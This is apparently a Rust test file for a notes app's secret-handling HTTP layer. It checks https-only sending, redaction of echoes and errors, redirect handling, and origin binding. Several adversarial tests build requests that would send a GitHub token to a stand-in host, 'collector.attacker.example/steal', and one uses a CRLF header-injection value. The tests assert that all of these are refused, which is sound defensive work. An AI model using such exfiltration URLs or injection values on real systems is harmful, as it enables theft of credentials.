//! A request that names secrets: filled in on the way out, struck from
//! everything on the way back, and never sent where it could be read.

use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::Arc;

use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpListener;

use super::{prepare, send, HttpRequest, Prepared, RequestHeader};
use crate::secrets::{write_secret, MemoryStore, SecretStore, SecretWrite, TemplatePart};

const TOKEN: &str = "ghp_S3CRET_VALUE";

fn text(text: &str) -> TemplatePart {
    TemplatePart::Text { text: text.into() }
}

fn secret(name: &str) -> TemplatePart {
    TemplatePart::Secret {
        secret: name.into(),
    }
}

/// Stores a secret in vault `v1`, bound to `origins` as Settings would.
fn set_bound(store: &MemoryStore, name: &str, value: &str, origins: &[&str]) {
    let origins: Vec<String> = origins.iter().map(|origin| origin.to_string()).collect();
    let write = SecretWrite {
        scope: "v1",
        name,
        value: Some(value),
        origins: Some(&origins),
    };
    write_secret(store, &write, &|_: &str, _: &[String]| true).unwrap();
}

fn store() -> MemoryStore {
    let store = MemoryStore::default();
    set_bound(&store, "github", TOKEN, &["https://api.test"]);
    set_bound(&store, "path", "private-feed-id", &["https://cal.test"]);
    set_bound(
        &store,
        "broken",
        "line\r\nX-Injected: yes",
        &["https://api.test"],
    );
    set_bound(
        &store,
        "not-a-url",
        "not a url ghp_S3CRET_VALUE",
        &["https://api.test"],
    );
    store
}

fn bearer(url: &str, name: &str) -> HttpRequest {
    HttpRequest {
        url: vec![text(url)],
        headers: vec![RequestHeader {
            name: "Authorization".into(),
            value: vec![text("Bearer "), secret(name)],
        }],
    }
}

fn refusal(request: &HttpRequest) -> String {
    match prepare(&store(), Some("v1"), request) {
        Ok(_) => panic!("the request was expected to be refused"),
        Err(error) => error,
    }
}

#[test]
fn a_header_is_filled_in_and_kept_out_of_debug_output() {
    let prepared = prepare(
        &store(),
        Some("v1"),
        &bearer("https://api.test/x", "github"),
    )
    .unwrap();

    let header = prepared.headers.get("authorization").unwrap();
    assert_eq!(header.to_str().unwrap(), format!("Bearer {TOKEN}"));
    assert!(header.is_sensitive());
    assert!(!format!("{:?}", prepared.headers).contains(TOKEN));
    assert_eq!(prepared.used, vec![("github".into(), TOKEN.into())]);
}

#[test]
fn a_url_is_filled_in_but_shown_by_its_reference() {
    let request = HttpRequest {
        url: vec![text("https://cal.test/"), secret("path"), text(".ics")],
        headers: vec![],
    };

    let prepared = prepare(&store(), Some("v1"), &request).unwrap();

    assert_eq!(
        prepared.url.as_str(),
        "https://cal.test/private-feed-id.ics"
    );
    assert_eq!(prepared.shown, "https://cal.test/{{secret:path}}.ics");
}

#[test]
fn a_secret_is_never_sent_over_plain_http() {
    let error = refusal(&bearer("http://api.test/x", "github"));
    assert_eq!(error, "a secret is only ever sent over https");
}

#[test]
fn plain_http_is_still_fine_without_a_secret() {
    let request = HttpRequest {
        url: vec![text("http://api.test/x")],
        headers: vec![],
    };
    assert!(prepare(&store(), None, &request).is_ok());
}

#[test]
fn a_secret_needs_an_open_vault_to_be_read_from() {
    let error = match prepare(&store(), None, &bearer("https://api.test/x", "github")) {
        Ok(_) => panic!("filled a secret with no vault open"),
        Err(error) => error,
    };
    assert_eq!(error, "no vault is open to read its secrets");
}

#[test]
fn a_missing_secret_is_named_and_nothing_is_sent() {
    let error = refusal(&bearer("https://api.test/x", "absent"));
    assert_eq!(error, "the secret \"absent\" is not set for this vault");
}

#[test]
fn a_secret_that_would_split_a_header_is_refused_without_repeating_it() {
    let error = refusal(&bearer("https://api.test/x", "broken"));

    assert!(error.contains("authorization header"), "{error}");
    assert!(!error.contains("X-Injected"), "{error}");
}

#[test]
fn a_url_that_does_not_parse_once_filled_does_not_repeat_the_secret() {
    let request = HttpRequest {
        url: vec![secret("not-a-url")],
        headers: vec![],
    };

    let error = refusal(&request);

    assert!(!error.contains(TOKEN), "{error}");
    // Named as it was written, which is all the author needs to find it.
    assert!(
        error.starts_with("{{secret:not-a-url}} is not a URL"),
        "{error}"
    );
}

#[test]
fn a_header_name_that_could_not_be_sent_is_refused() {
    let request = HttpRequest {
        url: vec![text("https://api.test/x")],
        headers: vec![RequestHeader {
            name: "Bad Name".into(),
            value: vec![text("v")],
        }],
    };
    assert_eq!(refusal(&request), "\"Bad Name\" is not a header name");
}

/// A server on this machine that answers every request with the request itself,
/// as the echo endpoints people test against do.
async fn echo_server() -> String {
    let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
    let address = listener.local_addr().unwrap();
    tokio::spawn(async move {
        let (mut socket, _) = listener.accept().await.unwrap();
        let mut request = vec![0; 4096];
        let read = socket.read(&mut request).await.unwrap();
        let body = String::from_utf8_lossy(&request[..read]).into_owned();
        let response = format!(
            "HTTP/1.1 200 OK\r\ncontent-length: {}\r\nconnection: close\r\n\r\n{body}",
            body.len()
        );
        socket.write_all(response.as_bytes()).await.unwrap();
    });
    format!("http://{address}/feed")
}

/// Sends a filled request to the echo server. Built by hand, because `prepare`
/// rightly refuses to send a secret over the plain http a local test server speaks.
#[tokio::test]
async fn the_secret_reaches_the_server_and_is_struck_from_its_echo() {
    let url = echo_server().await;
    let mut headers = reqwest::header::HeaderMap::new();
    headers.insert("authorization", format!("Bearer {TOKEN}").parse().unwrap());
    let prepared = Prepared {
        url: url.parse().unwrap(),
        headers,
        used: vec![("github".into(), TOKEN.into())],
        shown: url.clone(),
    };

    let handed_back = send(&prepared).await.unwrap();

    // It went out — the server echoed the header it received — and what the
    // webview is handed has the value struck from that echo.
    assert!(
        handed_back.contains("authorization: Bearer [secret github removed]"),
        "{handed_back}"
    );
    assert!(!handed_back.contains(TOKEN), "{handed_back}");
}

// Adversarial (P12-06): each test below fails until its finding is fixed.

/// A source note is text anyone could have written: a synced vault, or an MCP
/// client through the local API. Nothing ties `github` to the host it was set
/// for, so a note naming it can send it to any https host at all.
#[test]
fn a_secret_is_not_sent_to_a_host_it_was_not_set_for() {
    let request = bearer("https://collector.attacker.example/steal", "github");

    let outcome = prepare(&store(), Some("v1"), &request);

    assert!(
        outcome.is_err(),
        "the token would be sent to collector.attacker.example"
    );
}

/// `checked_url` quotes the raw URL with `{:?}`, which escapes `"` and `\`, so
/// the escaped value no longer matches what `redact` looks for and reaches the
/// webview, which can ask for exactly this by sending `{{secret:x}}` as a URL.
#[test]
fn a_secret_with_quotes_or_backslashes_is_not_repeated_when_the_url_does_not_parse() {
    let store = store();
    store.set("v1/password", "Qx\"7Zp\\Kw9").unwrap();
    let request = HttpRequest {
        url: vec![secret("password")],
        headers: vec![],
    };

    let error = match prepare(&store, Some("v1"), &request) {
        Ok(_) => panic!("the request was expected to be refused"),
        Err(error) => error,
    };

    assert!(!error.contains("7Zp"), "{error}");
    assert!(!error.contains("Kw9"), "{error}");
}

/// A server that answers with its request line percent-encoded, as an API does
/// when it builds a `next` link from the query it was sent.
async fn re_encoding_server() -> String {
    let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
    let address = listener.local_addr().unwrap();
    tokio::spawn(async move {
        let (mut socket, _) = listener.accept().await.unwrap();
        let mut request = vec![0; 4096];
        let read = socket.read(&mut request).await.unwrap();
        let line = String::from_utf8_lossy(&request[..read])
            .lines()
            .next()
            .unwrap_or_default()
            .replace('+', "%2B")
            .replace('/', "%2F")
            .replace('=', "%3D");
        let body = format!("{{\"next\":\"{line}\"}}");
        let response = format!(
            "HTTP/1.1 200 OK\r\ncontent-length: {}\r\nconnection: close\r\n\r\n{body}",
            body.len()
        );
        socket.write_all(response.as_bytes()).await.unwrap();
    });
    format!("http://{address}/feed")
}

/// Every value that went out is struck from what comes back, including a
/// base64 key the server echoes percent-encoded. Otherwise it is written into
/// a note, and so into the vault and Git.
#[tokio::test]
async fn a_secret_the_server_echoes_percent_encoded_is_still_struck() {
    const BASE64_KEY: &str = "aB3+dE6/gH9=";
    let url = re_encoding_server().await;
    let prepared = Prepared {
        url: format!("{url}?key={BASE64_KEY}").parse().unwrap(),
        headers: reqwest::header::HeaderMap::new(),
        used: vec![("feed-key".into(), BASE64_KEY.into())],
        shown: url.clone(),
    };

    let handed_back = send(&prepared).await.unwrap();

    // Proves the echo arrived at all, so the absence below means something.
    assert!(handed_back.contains("key%3D"), "{handed_back}");
    assert!(!handed_back.contains("aB3%2BdE6%2FgH9%3D"), "{handed_back}");
}

/// A server that answers every request with a redirect to `location`.
async fn redirecting_server(location: String) -> String {
    let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
    let address = listener.local_addr().unwrap();
    tokio::spawn(async move {
        let (mut socket, _) = listener.accept().await.unwrap();
        let mut request = vec![0; 4096];
        let _ = socket.read(&mut request).await.unwrap();
        let response = format!(
            "HTTP/1.1 302 Found\r\nlocation: {location}\r\ncontent-length: 0\r\nconnection: close\r\n\r\n"
        );
        socket.write_all(response.as_bytes()).await.unwrap();
    });
    format!("http://{address}/feed")
}

/// A server that answers `ok` and counts the connections it was sent.
async fn counting_server() -> (String, Arc<AtomicUsize>) {
    let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
    let address = listener.local_addr().unwrap();
    let reached = Arc::new(AtomicUsize::new(0));
    let counter = Arc::clone(&reached);
    tokio::spawn(async move {
        while let Ok((mut socket, _)) = listener.accept().await {
            counter.fetch_add(1, Ordering::SeqCst);
            let mut request = vec![0; 4096];
            let _ = socket.read(&mut request).await;
            let response = "HTTP/1.1 200 OK\r\ncontent-length: 2\r\nconnection: close\r\n\r\nok";
            let _ = socket.write_all(response.as_bytes()).await;
        }
    });
    (format!("http://{address}/landed"), reached)
}

fn carrying_secret(url: &str) -> Prepared {
    let mut headers = reqwest::header::HeaderMap::new();
    headers.insert("x-api-key", TOKEN.parse().unwrap());
    Prepared {
        url: url.parse().unwrap(),
        headers,
        used: vec![("github".into(), TOKEN.into())],
        shown: url.to_string(),
    }
}

/// Same host, another port: another origin, and possibly another program. A
/// secret in a header reqwest does not know to drop would follow it there.
#[tokio::test]
async fn a_request_carrying_a_secret_does_not_follow_a_redirect_to_another_port() {
    let (elsewhere, reached) = counting_server().await;
    let first = redirecting_server(elsewhere.clone()).await;

    let outcome = send(&carrying_secret(&first)).await;

    assert_eq!(outcome.unwrap_err(), "the feed answered 302 Found");
    assert_eq!(
        reached.load(Ordering::SeqCst),
        0,
        "the secret reached {elsewhere}"
    );
}

/// The control for the test above: the second listener is reachable, and a
/// request with no secret in it is followed there.
#[tokio::test]
async fn a_request_without_a_secret_follows_the_same_redirect() {
    let (elsewhere, reached) = counting_server().await;
    let first = redirecting_server(elsewhere).await;
    let mut prepared = carrying_secret(&first);
    prepared.headers.clear();
    prepared.used.clear();

    assert_eq!(send(&prepared).await.unwrap(), "ok");
    assert_eq!(reached.load(Ordering::SeqCst), 1);
}

// Host binding (A19-01): a secret goes only to the origins it was set for.

#[test]
fn a_secret_goes_to_the_origin_it_was_bound_to() {
    let request = bearer("https://api.test/x?page=2", "github");
    assert!(prepare(&store(), Some("v1"), &request).is_ok());
}

#[test]
fn a_secret_sent_elsewhere_is_refused_by_name_and_origin() {
    let error = refusal(&bearer(
        "https://collector.attacker.example/steal",
        "github",
    ));

    assert_eq!(
        error,
        "the secret \"github\" is only sent to https://api.test, not https://collector.attacker.example"
    );
}

#[test]
fn a_secret_bound_to_one_port_is_not_sent_to_another() {
    let request = bearer("https://api.test:8443/x", "github");
    assert!(prepare(&store(), Some("v1"), &request).is_err());
}

/// Set before bindings existed: it has none, and goes nowhere until it is given one.
#[test]
fn a_secret_with_no_binding_is_refused_until_bound() {
    let store = store();
    store.set("v1/legacy", "old-token").unwrap();

    let error = match prepare(&store, Some("v1"), &bearer("https://api.test/x", "legacy")) {
        Ok(_) => panic!("an unbound secret was sent"),
        Err(error) => error,
    };

    assert!(
        error.contains("\"legacy\" is not bound to a site yet"),
        "{error}"
    );
}

#[test]
fn a_request_naming_two_secrets_goes_only_where_both_are_bound() {
    let store = store();
    set_bound(&store, "cal-key", "k-123456", &["https://cal.test"]);
    let request = HttpRequest {
        url: vec![text("https://api.test/x?key="), secret("cal-key")],
        headers: vec![RequestHeader {
            name: "Authorization".into(),
            value: vec![text("Bearer "), secret("github")],
        }],
    };

    let error = match prepare(&store, Some("v1"), &request) {
        Ok(_) => panic!("cal-key was sent to api.test"),
        Err(error) => error,
    };

    assert!(error.contains("\"cal-key\""), "{error}");
    assert!(!error.contains("k-123456"), "{error}");
}

/// Replaces the refusal in the application's `sources-attacks.test.ts`
/// (P12-06). The local API may rewrite a source note's `url:`, as it may any
/// property; what the refresh then asks for — this request, exactly as that
/// test shows TypeScript building it from the patched note — is what the host
/// refuses, because `github` was bound to GitHub.
#[test]
fn a_source_the_api_pointed_at_another_host_is_refused_by_the_binding() {
    let store = MemoryStore::default();
    set_bound(&store, "github", TOKEN, &["https://api.github.com"]);
    let with_token = |before: &str| HttpRequest {
        url: vec![text(before), secret("github")],
        headers: vec![],
    };
    let as_written = with_token("https://api.github.com/repos/me/private/issues?access_token=");
    let as_patched = with_token("https://collector.attacker.example/steal?t=");

    assert!(prepare(&store, Some("v1"), &as_written).is_ok());
    assert!(prepare(&store, Some("v1"), &as_patched).is_err());
}
